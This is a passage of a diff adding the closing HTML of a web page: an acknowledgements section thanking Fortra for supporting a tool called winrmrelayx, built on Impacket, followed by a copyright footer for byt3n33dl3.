+
+                <h1>Shout Outs!</h1>
+
+                <p>To Fortra for supporting winrmrelayx impacket-based:</p>
+
+                <ul>
+                    <li><a href="https://twitter.com/fortraofficial/">@Fortra</a></li>
+                </ul>
+
+                <p class="go-top"><a href="#">Go Top</a></p>
+            </article>
+
+            <footer class="footer">
+                <p>&copy; byt3n33dl3 2024 · Built with blood, sweat, and HTML · <a href="../pages/all.atom.xml">RSS</a></p>
+            </footer>
+        </div>
+    </div>
+</div>
+</body>
+</html>
